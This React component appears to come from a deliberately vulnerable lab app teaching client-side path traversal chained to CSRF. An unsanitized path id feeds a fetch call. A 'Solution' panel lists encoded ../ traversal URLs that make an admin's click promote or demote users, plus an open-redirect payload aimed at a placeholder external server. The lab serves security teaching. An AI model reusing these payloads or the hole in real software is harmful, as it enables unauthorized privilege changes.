import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';

import { client } from '../client';

import { Accordion, Container } from 'react-bootstrap';

import NoteSingleView from './NoteSingleView';

const VulnerableNotesPathParam = () => {
  const [note, setNote] = useState(null);
  const { id } = useParams();

  // Fetch note by ID from path param
  useEffect(() => {
    if (id) {
      client.fetchNoteById(id)
        .then(data => setNote(data))
        .catch(error => console.error('Error fetching note:', error));
    }
  }, [id]);


  return (
    <Container className="mt-5">
      <Accordion defaultActiveKey="0">
        <Accordion.Item eventKey="0">
          <Accordion.Header>Explanation</Accordion.Header>
          <Accordion.Body>
            This page is vulnerable to a 1-click CSPT2CSRF. The application reads the id from the path parameter and fetches the note from the server.
            Based on the returned data, the note will be displayed. Then actions such as update or delete can be performed on this note.<br />
          </Accordion.Body>
        </Accordion.Item>
        <Accordion.Item eventKey="1">
          <Accordion.Header>Solution</Accordion.Header>
          <Accordion.Body>
            The following POC will load a gadget containing a crafted JSON Object. This object, itself must contain, another CSPT to the final POST endpoint.<br />
            CSPT source is in the id parameter contains in the path parameter and requires to be URL encoded.<br />
            <br />
            This gadget can be used to promote a user if the admin click on the "Update" button:<br />
            <a href="/vulnerable/note_path_param/..%2F..%2Fgadget%2Ffiles%2F66fc8d0755cf0db1bcfab29c%2Fraw/details">/vulnerable/note_path_param/..%2F..%2Fgadget%2Ffiles%2F66fc8d0755cf0db1bcfab29c%2Fraw/details</a><br />
            <br />
            This gadget can be used to demote a user if the admin click on the "Delete" button:<br />
            <a href="/vulnerable/note_path_param/..%2F..%2Fgadget%2Ffiles%2F66fc8d0755cf0d5f4cf25ba1%2Fraw/details">/vulnerable/note_path_param/..%2F..%2Fgadget%2Ffiles%2F66fc8d0755cf0d5f4cf25ba1%2Fraw/details</a><br />
            <br />
            You can also use the following open redirect to read JSON form your server<br />
            <a href='/vulnerable/note_path_param/..%2F..%2Fgadget%2Fopen_redirect%3Furl=<YOUR_EXTERNAL_SERVER_RETURNING_JSON_PAYLOAD>/details'>/vulnerable/note_path_param/..%2F..%2Fgadget%2Fopen_redirect%3furl=%3CYOUR_EXTERNAL_SERVER_RETURNING_JSON_PAYLOAD%3E/details</a>

          </Accordion.Body>
        </Accordion.Item>
      </Accordion>
      <br />
      <NoteSingleView note={note} setNote={setNote} />
    </Container>

  );
};

export default VulnerableNotesPathParam;